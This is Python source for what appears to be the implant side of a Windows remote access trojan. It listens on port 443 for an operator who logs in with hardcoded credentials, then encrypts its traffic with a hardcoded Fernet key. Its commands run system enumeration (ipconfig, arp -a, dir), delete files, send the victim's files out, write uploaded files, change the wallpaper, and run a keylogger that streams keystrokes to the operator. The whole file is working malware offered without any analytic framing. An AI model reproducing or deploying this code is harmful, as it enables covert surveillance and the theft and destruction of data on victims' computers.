import socket
import subprocess
import time
import os
from pynput import keyboard
from datetime import datetime
from cryptography.fernet import Fernet
import ctypes


key = b'dIDIXfq6xvMp0gshF8rI8-AGb41aucYBVR27nQWG2Xc='
cipher = Fernet(key)

VALID_USERNAME = "test"
VALID_PASSWORD = "test"

def authenticate():
    connection.send(Encrypt(b"Username: "))
    username = Decrypt(connection.recv(1024)).decode().strip()
    connection.send(Encrypt(b"Password: "))
    password = Decrypt(connection.recv(1024)).decode().strip()
    if username == VALID_USERNAME and password == VALID_PASSWORD:
        connection.send(Encrypt(b"Authentication successful"))
        return True
    else:
        connection.send(Encrypt(b"Authentication failed"))
        return False
def to_1024(data):
    chunk_size = 1024
    chunks = [data[i:i+chunk_size] for i in range(0, len(data), chunk_size)]
    return chunks

def Encrypt(data):
    return cipher.encrypt(data)

def Decrypt(data):
    return cipher.decrypt(data)

def keylogger(keys: int,BUFFER_SIZE):
    buffer = []
    i = 0
    # with open("keylogs.txt", "a") as log_file:
    def on_press(key):
        nonlocal i
        if i>=keys:
            if buffer:
                data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
                connection.send(Encrypt(data.encode()))
            connection.send(Encrypt(b'Done'))
            return False      
        try:
            # log_file.write(f"{key.char}")
            key_data = key.char
        except AttributeError:
            special_keys = {
                keyboard.Key.space: " [SPACE] ",
                keyboard.Key.enter: " [ENTER] ",
                keyboard.Key.backspace: " [BACKSPACE] ",
                keyboard.Key.shift: " [SHIFT] ",
                keyboard.Key.ctrl: " [CTRL] ",
                keyboard.Key.alt: " [ALT] "
            }
            # log_file.write(f" {key} ")
            key_data = special_keys.get(key, 'Unknown Key')
        buffer.append(key_data)
        i+=1
        if len(buffer)>= BUFFER_SIZE:
            data = f'{datetime.now().strftime('%H:%M:%S')} - {"".join(buffer)}'
            connection.send(Encrypt(data.encode()))
            buffer.clear()


    
    with keyboard.Listener(on_press=on_press) as listener:
        listener.join()

def change_wallpaper(image_path):
    if not os.path.exists(image_path):
        return Encrypt(b"Not done")
    

    SPI_SETDESKWALLPAPER = 20
    ctypes.windll.user32.SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, image_path, 0)
    return Encrypt(b"Done")

sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

server = ('0.0.0.0',443)
sock.bind(server)

sock.listen(1)
print("Listening for connections...")

connection, client_address = sock.accept()
print(f"Connection from {client_address}")


if authenticate():
    while 1:
        data = Decrypt(connection.recv(1024)).decode()
        if data=="close":
            print("Connection closed by server")
            break
        elif data=="dir":
            print(f"Received: {data}")
            result = Encrypt(subprocess.run("dir", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(Encrypt(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif data=="path":
            print(f"Received: {data}")
            path = Encrypt(os.path.abspath(os.getcwd()).encode())
            chunks = to_1024(path)
            connection.send(Encrypt(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif data=="ipconfig":
            print(f"Received: {data}")
            result = Encrypt(subprocess.run("ipconfig", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(Encrypt(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif data=="arp -a":
            print(f"Received: {data}")
            result = Encrypt(subprocess.run("arp -a", shell=True, text=True, capture_output=True).stdout.encode())
            chunks = to_1024(result)
            connection.send(Encrypt(str(len(chunks)).encode()))
            time.sleep(1)
            for chunk in chunks:
                connection.sendall(chunk)
        elif "del" in data:
            file_name = data.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            try:
                os.remove(f"{path}\\{file_name}")
                connection.send(Encrypt(b'Done'))
            except:
                connection.send(Encrypt(b'Wrong file name'))
        elif "cd" in data:
            directory = data.split(" ")[1]
            os.chdir(directory)
            current_dir = os.path.abspath(os.getcwd())
            connection.sendall(Encrypt(b'1'))
            time.sleep(1)
            connection.sendall(Encrypt(f"Moved to {current_dir}".encode()))
        elif "download" in data:
            file_name = data.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            try:
                with open(f"{path}\\{file_name}","rb") as file:
                    content = file.read()
                    file.close()
                content = Encrypt(content)
                chunks = to_1024(content)
                connection.send(Encrypt(str(len(chunks)).encode()))
                time.sleep(1)
                for chunk in chunks:
                    connection.sendall(chunk)
            except:
                connection.send(Encrypt(b'Wrong file name'))   
        elif "upload" in data:
            len_chunks = Decrypt(connection.recv(1024)).decode()
            print(f"Chunks coming: {len_chunks}")
            full_encrypted_data = b''
            for i in range(int(len_chunks)):
                chunk =connection.recv(1024)
                full_encrypted_data += chunk 
            file_name = data.split(" ")
            with open(f"./{file_name[1]}","ab") as file:
                file.write(Decrypt(full_encrypted_data))
                file.close()
                print("Done")          
        elif "wall" in data:
            file_name = data.split(" ")[1]
            path = os.path.abspath(os.getcwd())
            result = change_wallpaper(f"{path}\\{file_name}")
            connection.sendall(Encrypt(b"1"))
            connection.sendall(result)
        elif "keylogger" in data:
            keys = int(data.split(" ")[1])
            try:
                size = int(data.split(" ")[2])
            except:
                size = 5
            keylogger(keys,size)
        else:
            print(f"Received: {data.decode()}")
connection.close()